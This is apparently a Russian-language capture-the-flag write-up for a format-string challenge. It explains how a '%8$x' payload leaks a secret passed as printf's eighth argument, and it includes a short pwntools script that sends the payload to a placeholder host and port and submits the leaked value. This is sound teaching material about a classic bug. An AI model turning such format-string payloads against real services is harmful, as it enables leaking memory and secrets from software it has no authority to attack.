# formatstring — writeup

## Идея
Программа делает `printf(name, ...)`, где `name` — ввод пользователя (форматная строка под контролем атакующего).

Также она передает 7 "пустышек" и `secret` как **8-й аргумент**:

```c
printf(name,
  0x11111111,
  0x22222222,
  ...,
  0x77777777,
  secret);
```

Затем просит угадать `secret` в hex.

## Решение
Вывести 8-й аргумент форматной строки:

- Вариант 1 (позиционный): `%8$x`
- Вариант 2: вывести подряд 8 значений `%x.%x....` и взять 8-е.

## Эксплуатация
Пример через позиционный спецификатор:

```bash
# 1) На вопрос "What is your name?" отправляем:
%8$x
# 2) В ответе "Hello, <hex>!" получаем secret
# 3) На вопрос "Now guess the secret" отправляем тот же hex
```

Если хочется одним скриптом:

```python
from pwn import remote

io = remote('<host>', <port>)
io.recvuntil(b'What is your name? ')
io.sendline(b'%8$x')
out = io.recvuntil(b'Now guess the secret')
secret = out.split(b'Hello,')[1].split(b'!')[0].strip()
io.sendline(secret)
print(io.recvall().decode())
```
